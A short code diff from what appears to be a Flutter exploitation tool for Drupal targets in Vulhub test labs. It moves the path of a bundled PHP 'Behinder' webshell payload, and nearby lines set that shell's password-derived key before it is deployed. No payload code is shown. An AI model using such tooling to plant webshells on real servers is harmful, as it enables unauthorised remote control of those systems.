@@ -75,7 +75,7 @@ class _DrupalPageState extends BaseVulhubExpPageState<DrupalExpPage> {
           ? AppConstants.defaultShellPassword
           : _passwordCtrl.text.trim();
       var shellContent =
-          await rootBundle.loadString('assets/defaults/payloads/php_behinder.php');
+          await rootBundle.loadString('assets/defaults/payloads/webshell/php_behinder.php');
       final key = md5.convert(utf8.encode(password)).toString().substring(0, 16);
       shellContent =
           shellContent.replaceFirst(RegExp(r'\$key="[0-9a-f]{16}"'), '\$key="$key"');
